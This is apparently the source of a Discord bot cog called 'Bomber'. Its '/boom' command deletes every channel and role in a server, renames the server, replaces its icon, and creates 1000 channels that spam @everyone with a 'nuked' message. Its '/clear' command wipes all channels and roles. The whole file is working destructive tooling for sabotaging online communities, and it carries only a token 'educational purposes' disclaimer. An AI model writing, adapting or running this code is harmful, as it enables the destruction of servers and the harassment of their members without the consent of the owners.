# Import libraries:
import discord as Discord;
import asyncio as Asyncio;

import json as JSON;

from discord import app_commands as AppCommands;
from discord.ext import commands as Commands;


# Pull data from other sources:
with open("Imgs/Logo.png", "rb") as Logo:
    Logo = Logo.read()


# Create our class:
class Cleaner(Commands.Cog):
    def __init__(self, Client: Commands.Bot):
        self.Client = Client
        self.Tree = Client.tree


    # Create thy commands:
    @AppCommands.command(name = "boom", description = "Obliterate the target server in just a few seconds.")
    async def A(self, Interaction: Discord.Interaction):
        Data = JSON.loads(open("Information.json", "r").read())
        Debug = Data['Debug']

        if Debug == True:
            await Interaction.response.send_message("# An Error Has Occurred. \n* If you want to use any commands, **please disable debug mode** by running **/debug** \n* __This is to prevent any issues with the bot.__ \n\nIf you are a developer, please note that debug mode is enabled & you will not be able to use any commands.** \n\n-Thanks, from <@1002377371892072498>.",
                                                    ephemeral = True)
            
        else:
            try:
                for Channel in Interaction.guild.channels:
                    try:
                        await Channel.delete()

                    except Exception as Exc:
                        pass

                for Role in Interaction.guild.roles:
                    if Role != Interaction.guild.default_role:
                        try:
                            await Role.delete()

                        except Exception as Exc:
                            pass

                async def Bomb(Channel):
                    Channel = await Interaction.guild.create_text_channel(Channel)
                    await Channel.send("||@everyone|| \n\n**This server has been nuked by Bomber**. \n__Recovering from corruption may not be possible without any sort of backup server or rollback.__ \n# What Can I Do? \n1. There's nothing to be done. Your server is completely ruined ***unless*** you have a 1:1 replica of the server as a backup. \n2. If you see this message it's probably too late, but just hope your security bot does the job! \n\nTHIS NUKE WAS MORE THAN LIKELY CAUSED BY A MEMBER OF YOUR SERVER. **DEVELOPERS OF BOMBER ARE NOT RESPONSIBLE FOR ANY ACTIONS.** BOMBER WAS MADE FOR EDUCATIONAL PURPOSES ONLY & FOR THE INTENTION OF DISCORD FIXING THEIR ISSUES. \n\nFind our **OFFICIAL** Github repository [on Github](https://github.com/Suno0526/Bomber) OR ~~<https://github.com/Suno0526/Bomber/>~~")

                await Interaction.guild.edit(name = "Bombed by Bomber 💥")
                await Interaction.guild.edit(icon = Logo)

                Tasks = [Bomb("𝗥𝗘𝗔𝗗-𝗠𝗘") for _ in range(1000)]
                await Asyncio.gather(*Tasks)

            except Exception as Exc:
                print(Exc)

                await Interaction.response.send_message(":warning:  An error has occurred. \n<@1002377371892072498> has been notified of this bug & will report a bug fix that will be released globally shortly.",
                                                        ephemeral = True)

    @AppCommands.command(name = "clear", description = "Erase the target server's data in just a few seconds.")
    async def B(self, Interaction: Discord.Interaction):
        Data = JSON.loads(open("Information.json", "r").read())
        Debug = Data['Debug']

        if Debug == True:
            await Interaction.response.send_message("# An Error Has Occurred. \n* If you want to use any commands, **please disable debug mode** by running **/debug** \n* __This is to prevent any issues with the bot.__ \n\nIf you are a developer, please note that debug mode is enabled & you will not be able to use any commands.** \n\n-Thanks, from <@1002377371892072498>.",
                                                    ephemeral = True)
        else:
            try:
                for Channel in Interaction.guild.channels:
                    try:
                        await Channel.delete()

                    except Exception as Exc:
                        pass

                for Role in Interaction.guild.roles:
                    if Role != Interaction.guild.default_role:
                        try:
                            await Role.delete()

                        except Exception as Exc:
                            pass

                Cleared = await Interaction.guild.create_text_channel("Cleared")
                await Cleared.send("# This Server Has Been Wiped. \n* __Please note that this is not a nuke.__ \n* Your server data has been cleared & damage **is reversible**. \n\nIf you want to nuke the server, please run **/boom**.")

            except Exception as Exc:
                print(Exc)

                await Interaction.response.send_message(":warning:  An error has occurred. \n<@1002377371892072498> has been notified of this bug & will report a bug fix that will be released globally shortly.",
                                                        ephemeral = True)


# Sync our stuff:
async def setup(Client):
    await Client.add_cog(Cleaner(Client))
